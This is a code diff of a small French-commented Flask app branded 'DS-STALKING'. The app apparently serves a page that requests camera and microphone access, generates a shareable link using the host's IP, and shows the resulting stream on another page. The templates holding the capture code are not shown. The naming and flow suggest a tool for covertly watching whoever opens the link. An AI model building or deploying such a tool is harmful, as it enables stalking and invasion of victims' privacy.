@@ -1,40 +1,62 @@
-import os
-import random
-from flask import Flask, render_template, Response, request
-import cv2
-import threading
+from flask import Flask, render_template, request, jsonify
+import socket
+import pyfiglet
 
+# Créer une interface ASCII art avec pyfiglet
+def display_interface():
+    custom_fig = pyfiglet.Figlet(font="small")
+    ascii_art_text = custom_fig.renderText("DS-STALKING")
+    info = [
+        "BY: 2806",
+        "Telegram: t.me/Mr_2806",
+        "Tiktok: dedsec_x.0",
+        "Youtube: Dedsec assistant"
+    ]
+    border = "=" * 40
+    print(border)
+    print(ascii_art_text)
+    for line in info:
+        print(f"  {line}")
+    print(border)
+
+# Afficher l'interface ASCII au démarrage
+display_interface()
+
+# Initialiser l'application Flask
 app = Flask(__name__)
 
-# Choisir un port aléatoire
-port = random.randint(1024, 65535)
+# Obtenir l'adresse IP locale
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = "127.0.0.1"
+    finally:
+        s.close()
+    return ip
 
-# Variables pour le flux vidéo
-camera_url = "http://<IP>/video_feed"  # Remplacez par l'URL de votre caméra
-video_capture = cv2.VideoCapture(camera_url)
-
-@app.route('/')
+@app.route("/")
 def home():
-    return render_template("home.html", port=port)
-
-@app.route('/start_stream')
-def start_stream():
+    # Page qui demande l'accès à la caméra et au micro
     return render_template("camera.html")
 
-def gen_frames():
-    while True:
-        success, frame = video_capture.read()
-        if not success:
-            break
-        else:
-            ret, buffer = cv2.imencode('.jpg', frame)
-            frame = buffer.tobytes()
-            yield (b'--frame\r\n'
-                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n\r\n')
+@app.route("/stream_link", methods=["POST"])
+def stream_link():
+    # Génère un lien contenant l'adresse IP et le port
+    local_ip = get_local_ip()
+    port = 5000  # Remplacez si nécessaire
+    stream_url = f"http://{local_ip}:{port}/view_stream"
+    return jsonify({"stream_url": stream_url})
 
-@app.route('/video_feed')
-def video_feed():
-    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+# Flux vidéo
+@app.route("/view_stream")
+def view_stream():
+    return render_template("view_stream.html")
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=port)
+    # Exécuter le serveur Flask
+    local_ip = get_local_ip()
+    print(f"Serveur en cours d'exécution : http://{local_ip}:5000")
+    app.run(host="0.0.0.0", port=5000)
